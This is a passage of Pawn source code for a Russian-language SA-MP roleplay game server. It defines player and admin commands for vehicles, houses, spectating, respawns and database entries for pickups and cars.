	if(params[0] > 200 || params[0] < 0) return SendClientMessage(playerid, COLOR_GREY, "Кол-во бензина от 0 до 200!");
	Fuel[GetPlayerVehicleID(playerid)] = params[0];
	SendMes(playerid, COLOR_ORANGE, "Вы установили бензина в машине: %d",params[0]);
	return true;
}
CMD:admins(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] > 0 || PlayerInfo[playerid][pVIP] == true)
	{
		new str[256],full = 0;
		SendClientMessage(playerid, COLOR_ORANGE, "Администрация в сети:");
		foreach(new i:Player)
		{
			if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
			if(PlayerInfo[i][pAdmin] > 0)
			{
				new admrank[32];
				if(PlayerInfo[i][pAdmin] == 1){format(admrank,32,"{FF0000}» {0000ff}Младший администратор");}
				else if(PlayerInfo[i][pAdmin] == 2){format(admrank,32,"{FF0000}» {735184}Администратор");}
				else if(PlayerInfo[i][pAdmin] == 3){format(admrank,32,"{FF0000}» {660099}Старший администратор");}
				else if(PlayerInfo[i][pAdmin] == 4){format(admrank,32,"{FF0000}» {997a8d}Зам. гл.администратора");}
				else if(PlayerInfo[i][pAdmin] == 5){format(admrank,32,"{FF0000}» {d53e07}Главный администратор");}
				else if(PlayerInfo[i][pAdmin] == 6){format(admrank,32,"{FF0000}» {FF0000}Основатель");}
				full++;
				format(str,sizeof(str),"%s [ID: %d] - %s\n",PlayerInfo[i][pSendername],i,admrank);
				SendClientMessage(playerid, COLOR_WHITE, str);
			}
		}
		if(full == 0) SendClientMessage(playerid, COLOR_WHITE, "Администраторов нет в сети!");
	}
	else SendClientMessage(playerid, COLOR_GREY, YouCanNot);
	return true;
}
CMD:leaders(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	new full;
	SendClientMessage(playerid, COLOR_BLUE, "Лидеры организаций:");
	new text[12];
	for(new i = 0; i < GetMaxPlayers(); i++)
	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == 0) continue;
		if(PlayerInfo[i][pLeader] > 0)
		{
			if(PlayerInfo[i][pPhone][0] == 0) format(text, 8, "Нету");
			else format(text, 8, "%i", PlayerInfo[i][pPhone][1]);
			SendMes(playerid,COLOR_OOC,"[%s] %s - тел.%s",FracInfo[PlayerInfo[i][pLeader]][fName],PlayerInfo[i][pSendername],text);
			full++;
		}
	}
	if(full == 0) SendClientMessage(playerid, COLOR_BLUE, "Руководителей в сети нету!");
	return true;
}
CMD:gun(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /gun [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYEROFFLINE"");
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, ""TPLAYERNLOGGED"");
	new strings[1000],strin[100],strs[100],gunname[32];
	new weapons[13][2];
	format(strs, 100, "Игрок:\t\t\t%s", sendername(params[0]));
	strcat(strings, strs);
	for (new i = 0; i < 13; i++)
	{
		GetPlayerWeaponData(playerid, i, weapons[i][0], weapons[i][1]);
		GetWeaponName(weapons[i][0],gunname,32);
		if(weapons[i][0] != 0)
		{
			format(strin,70,"\n\nОружие:\t\t%s (%d)\nПатроны:\t\t%d",gunname,weapons[i][0],weapons[i][1]);
			strcat(strings,strin);
		}
	}
	ShowPlayerDialog(playerid,D_NULL,0,"Оружие игрока",strings,"Закрыть","");
	return true;
}
CMD:add(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	return ShowPlayerDialog(playerid, D_ADDNED, 2,"Добавить","Добавить дом\nДобавить бизнес\nДобавить пикап\nДобавить транспорт\nДобавить ATM","Принять","Отмена");
}
CMD:changecar(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid, "PlayerCar")) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в вашем личном транспорте!");
	if(sscanf(params, "ud", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /changecar [id игрока] [доплата]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете обменять транспорт себе!");
	if(GetPlayerHouse(params[0]) == 0) return SendClientMessage(playerid, COLOR_GREY, PlayerDoNotHaveAtHome);
	if(!IsPlayerInVehicle(params[0], GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
	if(params[1] < 0 || params[1] > 7000000) return SendClientMessage(playerid, COLOR_GREY, "Кол-во доплаты от 1 до 7000000!");
	SendMes(playerid, COLOR_LIGHTBLUE, "Вы предложили обменяться транспортами с %s. Твоя доплата: %d", sendername(params[0]), params[1]);
	SendMes(params[0], COLOR_LIGHTBLUE, "%s предложил обменяться транспортами с вами. Доплата: %d", PlayerInfo[playerid][pSendername], params[1]);
	format(totalstring, 256, "{FFFF00}%s (ID: %i) предложил обменять свой транспорт\n\n\t\t{ffffff}(Модель: %s, Доплата: %i)\n{FFFF00}на ваш транспорт\n\t\t{ffffff}(Модель: %s)\n\n{FFFF00}Вы согласны?",
	PlayerInfo[playerid][pSendername], playerid,VehicleNameS[GetVehicleModel(GetPVarInt(playerid, "PlayerCar"))-400], params[1], VehicleNameS[GetVehicleModel(GetPVarInt(params[0], "PlayerCar"))-400]);
	ShowPlayerDialog(params[0], D_JOB+24, 0, "Обменять транспорт", totalstring, "Да", "Нет");
	format(totalstring, 256, "{FFFF00}Вы предложили %s'у (ID: %i) обменять свой транспорт\n\n\t\t{ffffff}(Модель: %s, Доплата: %i)\n{FFFF00}на его транспорт\n\t\t{ffffff}(Модель: %s)",
	sendername(params[0]), params[0], VehicleNameS[GetVehicleModel(GetPVarInt(playerid, "PlayerCar"))-400], params[1], VehicleNameS[GetVehicleModel(GetPVarInt(params[1], "PlayerCar"))-400]);
	ShowPlayerDialog(playerid, D_NULL, 0, "Обменять транспорт", totalstring, "Закрыть", "");
	SetPVarInt(params[0], "CarPlayer", playerid);
	SetPVarInt(params[0], "CarPrice", params[1]);
	return true;
}
CMD:changebusines(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	SendMes(params[0], COLOR_LIGHTBLUE, "В разработке");
	return true;
}
CMD:changehouse(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAtHome);
	if(sscanf(params, "ud", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /changehouse [id игрока] [доплата]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(GetPlayerHouse(params[0]) == 0) return SendClientMessage(playerid, COLOR_GREY, PlayerDoNotHaveAtHome);
	if(params[1] < 0 || params[1] > 15000000) return SendClientMessage(playerid, COLOR_GREY, "Кол-во доплаты от 1 до 15000000!");
	new i = GetPVarInt(playerid, "PlayerHouse");
	new i2 = GetPVarInt(params[0], "PlayerHouse");
	if(IsPlayerInRangeOfPoint(playerid, 5.0, HouseInfo[i][hEntrx], HouseInfo[i][hEntry], HouseInfo[i][hEntrz]) || IsPlayerInRangeOfPoint(playerid, 15.0, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
	{
		if(IsPlayerInRangeOfPlayer(3.0, playerid, params[0]) && params[0] != INVALID_PLAYER_ID)
		{
			if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете обменять дом себе!");
			SendMes(playerid, COLOR_LIGHTBLUE, "Вы предлежили обменяться домами с %s. Твоя доплата: %d",sendername(params[0]), params[1]);
			SendMes(params[0], COLOR_LIGHTBLUE, "%s предлежил обменяться домами с вами. Доплата: %d",PlayerInfo[playerid][pSendername], params[1]);
			format(totalstring, 256, "{9ACD32}%s (ID: %d) предложил обменять свой дом\n\n\t\t{ffffff}(Номер: %d, Класс: %s, Доплата: %d)\n{9ACD32}на ваш дом\n\t\t{ffffff}(Номер: %d, Тип: %s)\n\n{9ACD32}Вы согласны?", PlayerInfo[playerid][pSendername],playerid,  i, HouseInfo[i][hDiscript], params[1], i2, HouseInfo[i2][hDiscript]);
			ShowPlayerDialog(params[0], D_SELLHOUSE+1, 0, "Обменять дом", totalstring, "Да", "Нет");
			format(totalstring, 256, "{9ACD32}Вы предложили %s'у (ID: %d) обменять свой дом\n\n\t\t{ffffff}(Номер: %d, Тип: %s, Доплата: %d)\n{9ACD32}на его дом\n\t\t{ffffff}(Номер: %d, Тип: %s)", sendername(params[0]), params[0],i, HouseInfo[i][hDiscript], params[1], i2, HouseInfo[i2][hDiscript]);
			ShowPlayerDialog(playerid, D_NULL, 0, "Обменять дом", totalstring, "Закрыть", "");
			HouseOffer[params[0]] = playerid;
			HousePrice[params[0]] = params[1];
		}
		else SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться рядом с тобой!");
	}
	else SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInHome);
	return true;
}
CMD:ppc(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(PPC[playerid] == true)
	{
		new Float:x, Float:y, Float:z, Float:fa;
		GetPlayerPos(playerid, x, y, z);
		GetPlayerFacingAngle(playerid, fa);
		TOTALENTERS++;
		sscanf(coordc,"p<,>fffdddds[32]",
		EntersInfo[TOTALENTERS][pX], EntersInfo[TOTALENTERS][pY],EntersInfo[TOTALENTERS][pZ], EntersInfo[TOTALENTERS][pM],
		EntersInfo[TOTALENTERS][pT],EntersInfo[TOTALENTERS][pI], EntersInfo[TOTALENTERS][pV], EntersInfo[TOTALENTERS][pName]);
		format(query, sizeof(query), "INSERT INTO "TABLE_ENTERS" (id, x, y, z, m, t, i, v, tx, ty, tz, tfa, ti, tv, name) VALUES (%d, '%f', '%f', '%f', %d, %d, %d, %d, '%f', '%f', '%f', '%f', %d, %d, '%s')",
		TOTALENTERS,EntersInfo[TOTALENTERS][pX], EntersInfo[TOTALENTERS][pY],EntersInfo[TOTALENTERS][pZ],EntersInfo[TOTALENTERS][pT], EntersInfo[TOTALENTERS][pM],
		EntersInfo[TOTALENTERS][pI], EntersInfo[TOTALENTERS][pV],x,y,z,fa,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),
		EntersInfo[TOTALENTERS][pName]);
		mysql_query(query);
		PPC[playerid] = false;
		SendMes(playerid, COLOR_ORANGE, "Пикап номер %d создан",TOTALENTERS);
	}
	return true;
}
CMD:vpc(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(GetPVarInt(playerid, "AddVehicleFrac") == 0) return true;
	if(GetPlayerState(playerid) != 2) return true;
	if(!IsPlayerInVehicle(playerid, GetPVarInt(playerid, "AddVehicleFrac"))) return true;
	new Float:X,Float:Y,Float:Z,Float:FA;
	GetVehicleZAngle(GetPlayerVehicleID(playerid), FA);
	GetVehiclePos(GetPlayerVehicleID(playerid), X,Y,Z);
	DestroyVehicle(GetPVarInt(playerid, "AddVehicleFrac"));
	TOTALVEH++;
	sscanf(coordv, "p<,>iiiiiii", VehInfo[TOTALVEH][vModel], VehInfo[TOTALVEH][vColor][0],
	VehInfo[TOTALVEH][vColor][1],VehInfo[TOTALVEH][vFr],VehInfo[TOTALVEH][vInt],VehInfo[TOTALVEH][vWorld], VehInfo[TOTALVEH][vStatus]);
	format(VehInfo[TOTALVEH][vColors], 16, "%i, %i", VehInfo[TOTALVEH][vColor][0],VehInfo[TOTALVEH][vColor][1]);
	VehInfo[TOTALVEH][vX] = X;
	VehInfo[TOTALVEH][vY] = Y;
	VehInfo[TOTALVEH][vZ] = Z;
	VehInfo[TOTALVEH][vFa] = FA;
	VehInfo[TOTALVEH][vVehicle] = CreateVehicle(VehInfo[TOTALVEH][vModel], VehInfo[TOTALVEH][vX], VehInfo[TOTALVEH][vY], VehInfo[TOTALVEH][vZ], VehInfo[TOTALVEH][vFa],VehInfo[TOTALVEH][vColor][0],VehInfo[TOTALVEH][vColor][1], 300);
	LinkVehicleToInterior(VehInfo[TOTALVEH][vVehicle], VehInfo[TOTALVEH][vInt]);
	SetVehicleVirtualWorld(VehInfo[TOTALVEH][vVehicle], VehInfo[TOTALVEH][vWorld]);
	Fuel[VehInfo[TOTALVEH][vVehicle]] = 200;
	Engine[VehInfo[TOTALVEH][vVehicle]] = false;
	Lights[VehInfo[TOTALVEH][vVehicle]] = false;
	DeletePVar(playerid, "AddVehicleFrac");
	format(totalstring,sizeof(totalstring),"INSERT INTO "TABLE_VEH" (id, model, x, y, z, fa, vint, world, colors, fraction, status) VALUES (%i, %i, '%f', '%f', '%f', '%f', %i, %i, '%s', %i, %i)",
	TOTALVEH,VehInfo[TOTALVEH][vModel],VehInfo[TOTALVEH][vX],VehInfo[TOTALVEH][vY],VehInfo[TOTALVEH][vZ],VehInfo[TOTALVEH][vFa],VehInfo[TOTALVEH][vInt],
	VehInfo[TOTALVEH][vWorld],VehInfo[TOTALVEH][vColors],VehInfo[TOTALVEH][vFr], VehInfo[TOTALVEH][vStatus]);
	mysql_query(totalstring);
	SendMes(playerid, COLOR_ORANGE, "Транспорт номер %i создан", TOTALVEH);
	return true;
}
CMD:showtuning(playerid, params[])
{
	ShowSTODialog(playerid);
	return true;
}
CMD:tpc(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	if(TPC[playerid] == false)
	{
		if(!IsPlayerInVehicle(playerid, VehTest[playerid])) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
		new Float:X,Float:Y,Float:Z,Float:FA;
		GetVehicleZAngle(VehTest[playerid], FA);
		GetVehiclePos(VehTest[playerid], X,Y,Z);
		format(coordh, sizeof(coordh), "%f, %f, %f, %f", X, Y, Z, FA);
		DestroyVehicle(VehTest[playerid]);
		TPC[playerid]=true;
		return SendClientMessage(playerid, COLOR_LIGHTRED, "Координаты созданы. Установите интерьер: /tpc");
	}
	if(TPC[playerid] == true)
	{
		new string1[1000];
		strcat(string1,"ВАЖНО: Цена , Тип интерьера\n\nПРИМЕР: 100000 , 1\n\n");
		strcat(string1,"1. [Класс: A]\t12. [Класс: C]\t23. [Класс: C]\t34. [Класс: C]\n");
		strcat(string1,"2. [Класс: C]\t13. [Класс: C]\t24. [Класс: B]\t35. [Класс: C]\n");
		strcat(string1,"3. [Класс: A]\t14. [Класс: B]\t25. [Класс: B]\n");
		strcat(string1,"4. [Класс: C]\t15. [Класс: C]\t26. [Класс: E]\n");
		strcat(string1,"5. [Класс: B]\t16. [Класс: B]\t27. [Класс: E]\n");
		strcat(string1,"6. [Класс: B]\t17. [Класс: B]\t28. [Класс: E]\n");
		strcat(string1,"7. [Класс: E]\t18. [Класс: A]\t29. [Класс: C]\n");
		strcat(string1,"8. [Класс: B]\t19. [Класс: C]\t30. [Класс: A]\n");
		strcat(string1,"9. [Класс: A]\t20. [Класс: E]\t31. [Класс: C]\n");
		strcat(string1,"10. [Класс: B]\t21. [Класс: A]\t32. [Класс: C]\n");
		strcat(string1,"11. [Класс: C]\t22. [Класс: B]\t33. [Класс: E]\n");
		ShowPlayerDialog(playerid,D_ADDNED+1,1,"Добавить дом",string1,"Выбрать","Закрыть");
	}
	return true;
}
CMD:vehid(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	format(totalstring, 64, "ID транспорта: %d", GetPlayerVehicleID(playerid));
	SendClientMessage(playerid, COLOR_WHITE, totalstring);
	return true;
}
CMD:lock(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPVarInt(playerid,"AntiFlood") > gettime()) return SendClientMessage(playerid, COLOR_GREY, PlayerCanSendEveryThreeSec);
	new Float:x,Float:y,Float:z;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAnyCar);
	new i = GetPVarInt(playerid, "PlayerCar");
	GetVehiclePos(i,x,y,z);
	if(!IsPlayerInRangeOfPoint(playerid,10.0,x,y,z)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotAtCar);
	if(IsLocked[i] == false)
	{
		PlayerInfo[playerid][cLock] = 1;
		IsLocked[i] = true;
		CarDoors(i, PlayerInfo[playerid][cLock]);
		format(totalstring, 16, "~r~Lock");
		GameTextForPlayer(playerid, totalstring, 3000,5);
		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		format(totalstring, 90, "%s закрыл свой транспорт", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
		return true;
	}
	else
	{
		PlayerInfo[playerid][cLock] = 0;
		IsLocked[i] = false;
		CarDoors(i, PlayerInfo[playerid][cLock]);
		format(totalstring, 16, "~g~unlock");
		GameTextForPlayer(playerid, totalstring, 3000,5);
		PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
		format(totalstring, 90, "%s открыл свой транспорт", PlayerInfo[playerid][pSendername]);
		ProxDetectorNew(playerid,30.0,COLOR_PURPLE,totalstring);
	}
	return true;
}
CMD:sellcar(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не владеете домом!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid, "PlayerCar")) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в вашем личном транспорте!");
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 462) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете продать мопед!");
	if(sscanf(params, "ud", params[0], params[1])) return ShowPlayerDialog(playerid, D_JOB+22, 0, "Продать транспорт", "{ffffff}Вы хотите продать свой транспорт?\n\n{FF6347}Внимание! Вам вернут только половину стоимости транспорта!\n\n!!! Для продажи авто игроку, введите /sellcar [id] [цена] !!!", "Да", "Нет");
	// ПРОДАЖА ИГРОКУ
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете продать транспорт себе!");
	if(GetPlayerHouse(params[0]) == 0) return SendClientMessage(playerid, COLOR_GREY, PlayerDoNotHaveAtHome);
	if(!IsPlayerInVehicle(params[0], GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GREY, "Игрок должен находиться с вами в транспорте!");
	if(params[1] < 1 || params[1] > 5000000) return SendClientMessage(playerid, COLOR_GREY, "Стоимость от 1 до 5000000$!");
	//==
	format(totalstring, 131, "{FFFF00}%s (ID: %i) предложил вам продать свой транспорт\n\n\t\t{ffffff}(Модель: %s, Стоимость: %i)\n\n{FFFF00}Вы согласны?",sendername(params[1]),VehicleNameS[GetVehicleModel(GetPVarInt(playerid, "PlayerCar"))-400], VehicleNameS[GetVehicleModel(GetPVarInt(params[0], "PlayerCar"))-400]);
	ShowPlayerDialog(params[0], D_JOB+25, 0, "Купить транспорт", totalstring, "Да", "Нет");
	//==
	format(totalstring, 131, "{FFFF00}Вы предложили %s продать свое авто\n\n\t\t{ffffff}(Модель: %s, Стоимость: %i)",sendername(params[0]), VehicleNameS[GetVehicleModel(GetPVarInt(playerid, "PlayerCar"))-400], VehicleNameS[GetVehicleModel(GetPVarInt(params[1], "PlayerCar"))-400]);
	ShowPlayerDialog(playerid, D_NULL, 0, "Продать транспорт", totalstring, "Закрыть", "");
	SetPVarInt(params[0], "CarPlayer", playerid);
	SetPVarInt(params[0], "CarPrice", params[1]);
	return true;
}
CMD:nametags(playerid, params[])
{
	foreach(new i:Player) ShowPlayerNameTagForPlayer(playerid, i, false);
	GameTextForPlayer(playerid, "~W~Nametags ~R~off", 5000, 5);
	return true;
}
CMD:carpass(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(GetPlayerHouse(playerid) == 0) return SendClientMessage(playerid, COLOR_GREY, YouDoNotHaveAnyCar);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(GetPlayerVehicleID(playerid) != GetPVarInt(playerid, "PlayerCar")) return SendClientMessage(playerid, COLOR_GREY, "Вы должны находиться в вашем личном транспорте!");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /carpass [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	SendClientMessage(params[0], COLOR_YELLOW,"[ - - - - - - - - - - - - - - - - - - - - - ]");
	SendMes(params[0], COLOR_YELLOW, "[ Владелец: {ffffff}%s ]",PlayerInfo[playerid][pSendername]);
	SendMes(params[0], COLOR_YELLOW, "[ Модель: {ffffff}%s ]",VehicleNameS[GetVehicleModel(GetPVarInt(playerid, "PlayerCar"))-400]);
	if(PlayerInfo[playerid][cClass] == 3) SendClientMessage(params[0], COLOR_YELLOW, "[ Класс: {ffffff}C ]");
	if(PlayerInfo[playerid][cClass] == 2) SendClientMessage(params[0], COLOR_YELLOW, "[ Класс: {ffffff}B ]");
	if(PlayerInfo[playerid][cClass] == 1) SendClientMessage(params[0], COLOR_YELLOW, "[ Класс: {ffffff}A ]");
	if(PlayerInfo[playerid][cClass] == 4) SendClientMessage(params[0], COLOR_YELLOW, "[ Класс: {ffffff}Нету ]");
	SendClientMessage(params[0], COLOR_YELLOW,"[ - - - - - - - - - - - - - - - - - - - - - ]");
	format(totalstring, 100, "%s показал(а) документы на транспорт %s", PlayerInfo[playerid][pSendername], sendername(params[0]));
	ProxDetectorNew(playerid, 30.0, COLOR_PURPLE, totalstring);
	return true;
}
CMD:changecolor(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(InShop[playerid] > 0) return true;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, PlayerIsNotInCar);
	if(sscanf(params, "ii", params[0], params[1])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /changecolor [цвет1] [цвет2]");
	if(params[0] < 0 || params[0] > 252) return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
	if(params[1] < 0 || params[1] > 252) return SendClientMessage(playerid, COLOR_GREY, "ID цвета от 0 до 252!");
	ChangeVehicleColor(GetPlayerVehicleID(playerid), params[0], params[1]);
	SendMes(playerid, COLOR_ORANGE, "Цвет транспорт №%i изменен", GetPlayerVehicleID(playerid));
	return true;
}
CMD:spec(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /spec [id игрока]");
	if(!IsPlayerConnected(params[0])) return SendClientMessage(playerid, COLOR_GREY, TPLAYEROFFLINE);
	if(PlayerLogged[params[0]] == 0) return SendClientMessage(playerid, COLOR_GREY, TPLAYERNLOGGED);
	if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Нельзя наблюдать за собой!");
	new inter, world, Float:X, Float:Y, Float:Z, Float:FA;
	if(GetPVarInt(playerid, "SpecBool") == 0)
	{
		GetPlayerPos(playerid, X, Y, Z);
		GetPlayerFacingAngle(playerid, FA);
		inter = GetPlayerInterior(playerid);
		world = GetPlayerVirtualWorld(playerid);
	}
	SetPlayerInterior(playerid,GetPlayerInterior(params[0]));
	SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(params[0]));
	TogglePlayerSpectating(playerid,true);
	if(IsPlayerInAnyVehicle(params[0]))
	{
		new carid = GetPlayerVehicleID(params[0]);
		PlayerSpectateVehicle(playerid, carid);
	}
	else PlayerSpectatePlayer(playerid,params[0]);
	SendMes(playerid, COLOR_ORANGE, "Наблюдение за: %s (ID: %d)", sendername(params[0]), params[0]);
	if(GetPVarInt(playerid, "SpecBool") == 0)
	{
		SetPVarInt(playerid, "SpecBool", 1);
		SetPVarFloat(playerid, "SpecX", X);
		SetPVarFloat(playerid, "SpecY", Y);
		SetPVarFloat(playerid, "SpecZ", Z);
		SetPVarFloat(playerid, "SpecFA", FA);
		SetPVarInt(playerid, "SpecInt", inter);
		SetPVarInt(playerid, "SpecWorld", world);
	}
	return true;
}
CMD:specoff(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || AdminLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(GetPVarInt(playerid, "SpecBool") == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не наблюдаете за игроком!");
	TogglePlayerSpectating(playerid,false);
	SendClientMessage(playerid, COLOR_LIGHTRED, "Наблюдение прекращено");
	//DeletePVar(playerid, "SpecBool");
	return true;
}
CMD:res(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdminDuty] == 0) return SendClientMessage(playerid, COLOR_GREY, YouCanNotAdminDuty);
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	new str[90], str2[512];
	for(new i = 1; i <= TOTALFRAC; i++)
	{
		format(str,sizeof(str),"Р. Авто: %s\n",FracInfo[i][fName]);
		strcat(str2, str);
	}
	strcat(str2, "Респ. мопеды\n");
	strcat(str2, "Респ. авто фермы\n");
	strcat(str2, "Респ. ВСЕ авто\n");
	ShowPlayerDialog(playerid, D_JOB+41, 2, "Респавн авто", str2, "Принять", "Отмена");
	return true;
}
CMD:setfraction(playerid, params[])
{
	if(PlayerLogged[playerid] == 0) return true;
	if(PlayerInfo[playerid][pAdmin] < 6 || AdminLogged[playerid] == false) return true;
	new str[90], str2[512];
	for(new i = 1; i <= TOTALFRAC; i++)
	{
		format(str,sizeof(str),"№%i - %s\n",i,FracInfo[i][fName]);
		strcat(str2, str);
	}
	ShowPlayerDialog(playerid, D_JOB+137, 2, "Организации", str2, "Принять", "Отмена");
	return true;
}
CMD:gps(playerid, params[])
{
    if(PlayerLogged[playerid] == 0) return 1;
    if(MechCallTime[playerid] > 0 || TaxiCallTime[playerid] > 0 || MedicCallTime[playerid] > 0 || GetPVarInt(playerid, "ProductID") > 0) return SendClientMessage(playerid, COLOR_GREY, "Ошибка! Действие невозможно!");
   	DisablePlayerRaceCheckpoint(playerid);
   	DeletePVar(playerid,"pGPSWork");
	ShowPlayerDialog(playerid, D_GPS, DIALOG_STYLE_LIST, "Телефон > Карты GPS", "[1] Для новичков\n[2] Работы для начинающих\n[3] Работы\n[4] Базы организаций\n[5] Фермы [1 online]", "Выбрать", "Отмена");

	return 1;
}
CMD:gm(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 1) return 1;
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_WHITE, "Введите: /gm [id игрока]");
    new Float:boomx, Float:boomy, Float:boomz;
    GetPlayerPos(params[0],boomx, boomy, boomz);
    GetPlayerHealth(params[0],AdmGMHP[params[0]]);
    AdmGM[playerid] = 1;
    AdmGMID[playerid] = params[0];
    CreateExplosion(boomx, boomy , boomz+7.5, 5, 0.5);
    GmtestTimer[playerid] = SetTimerEx("Gmtest",1000,true,"d",playerid);
    return 1;
}
CMD:gmx(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		foreach(new i:Player)
		{
			if(IsPlayerConnected(i))
			{
